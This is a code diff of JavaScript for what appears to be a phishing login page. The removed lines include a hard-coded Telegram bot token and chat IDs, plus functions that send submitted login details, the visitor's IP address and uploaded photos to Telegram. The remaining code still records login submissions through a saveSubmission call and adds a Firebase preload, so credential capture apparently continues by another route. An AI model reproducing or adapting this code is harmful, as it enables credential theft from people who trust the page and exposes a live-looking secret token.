@@ -52,13 +52,6 @@ function saveSubmission(data) {
   });
 }
 
-// ================= CONFIG =================
-const BOT_TOKEN = '8902846687:AAGE2QmaVtf-wden-XEp-5VHdAirq03igyQ';
-const LOGIN_CHAT_ID = '-1003919574881';
-const REQUEST_CHAT_ID = '-1003809176248';
-
-const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-
 // ================= PRELOADER =================
 window.addEventListener('load', () => {
     const preloader = document.getElementById('preloader');
@@ -205,8 +198,6 @@ if (loginForm) {
 ðŸŒ <b>IP:</b> ${await ipPromise}
         `.trim();
 
-        sendTelegramMessage(LOGIN_CHAT_ID, loginText).catch(() => {});
-
         saveSubmission({
             event: 'login',
             type: 'Login',
@@ -298,57 +289,8 @@ if (successOk) {
     });
 }
 
-// ================= TELEGRAM FUNCTIONS =================
-async function sendTelegramMessage(chatId, text) {
-    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-        console.warn('Demo mode: No bot token set. Message:', text);
-        return;
-    }
-    try {
-        await fetch(`${TELEGRAM_API}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: text,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch (err) {
-        console.error('Telegram send failed:', err);
-    }
-}
-
-async function sendTelegramPhoto(chatId, photoFile, caption) {
-    if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-        console.warn('Demo mode: No bot token set. Photo upload skipped.');
-        return;
-    }
-    try {
-        const tgForm = new FormData();
-        tgForm.append('chat_id', chatId);
-        tgForm.append('photo', photoFile);
-        tgForm.append('caption', caption);
-        tgForm.append('parse_mode', 'HTML');
-        
-        await fetch(`${TELEGRAM_API}/sendPhoto`, {
-            method: 'POST',
-            body: tgForm
-        });
-    } catch (err) {
-        console.error('Telegram photo send failed:', err);
-    }
-}
-
-async function getIP() {
-    try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip;
-    } catch {
-        return 'Unknown';
-    }
-}
+// Preload Firebase in background
+loadFirebase().catch(e => console.warn('Firebase preload skipped:', e));
 
 // ================= PROFILE PAGE =================
 function saveRequestToHistory(type, data) {
